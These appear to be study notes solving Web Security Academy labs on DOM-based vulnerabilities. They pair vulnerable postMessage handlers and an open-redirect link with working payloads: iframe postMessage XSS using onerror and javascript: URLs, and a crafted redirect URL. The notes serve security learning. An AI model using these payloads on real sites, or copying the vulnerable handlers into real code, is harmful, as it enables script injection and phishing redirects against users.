# DOM-based Vulnerability

### DOM XSS using web messages
* Vulnerable Code - `addEventListener()` listens for a web message
```html
<!-- Ads to be inserted here -->
<div id='ads'>
</div>
<script>
    window.addEventListener('message', function(e) {
        document.getElementById('ads').innerHTML = e.data;
    })
</script>
```
* Payload - By adding a wrong `src` and `enerror=` function will cause `print()`
```html
<iframe src="https://ac7e1f1c1f3ed2d1c06281a0005800be.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```

### DOM XSS using web messages and a JavaScript URL
* Vulnerable Code - `indexOf` looks for http: or https: in the message body
```html
<script>
    window.addEventListener('message', function(e) {
        var url = e.data;
        if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
            location.href = url;
        }
    }, false);
</script>
```
* Payload
```html
<iframe src="https://acf31f5e1e1ff65ec0851f1800fc00fa.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//https:','*')">
```

### DOM XSS using web messages and JSON.parse
* Vulnerable Code - `JSON.parse` parse the message data.
```html
<script>
    window.addEventListener('message', function(e) {
        var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
        document.body.appendChild(iframe);
        try {
            d = JSON.parse(e.data);
        } catch(e) {
            return;
        }
        switch(d.type) {
            case "page-load":
                ACMEplayer.element.scrollIntoView();
                break;
            case "load-channel":
                ACMEplayer.element.src = d.url;
                break;
            case "player-height-changed":
                ACMEplayer.element.style.width = d.width + "px";
                ACMEplayer.element.style.height = d.height + "px";
                break;
        }
    }, false);
</script>
```
* Payload
```html
<iframe src="https://acbe1f971f2cee6bc0482be200600037.web-security-academy.net/" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```

### DOM-based open redirection
* Vulnerable Code
```html
<a href='#' onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = "/"'>Back to Blog</a>
```
* Payload
```html
### Visit the following URL. The vulnerable code will read the value of url= and redirect the user to the following url when "Back to Blog" is clicked:

https://acaa1f4e1f5e9aa7c0c6e265002f004c.web-security-academy.net/post?postId=4&url=https://exploit-ac4f1f6d1f429a0dc0e4e2eb018e0096.web-security-academy.net/ 
```